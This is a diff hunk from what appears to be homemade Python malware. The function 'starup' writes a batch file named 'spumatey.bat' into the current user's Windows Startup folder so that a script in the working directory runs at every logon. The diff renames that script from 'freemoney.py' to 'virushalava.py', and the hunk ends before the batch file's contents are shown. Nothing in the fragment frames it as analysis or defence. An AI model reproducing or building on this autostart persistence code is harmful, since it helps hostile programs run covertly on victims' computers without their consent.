@@ -6,7 +6,7 @@ from ctypes import *
 
 def starup():
 	a = os.getcwd()
-	file_play = r'%s\freemoney.py' % a
+	file_play = r'%s\virushalava.py' % a
 	pas = getpass.getuser()
 	bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % pas
 	with open(bat_path + '\\' + 'spumatey.bat', 'w+') as file:
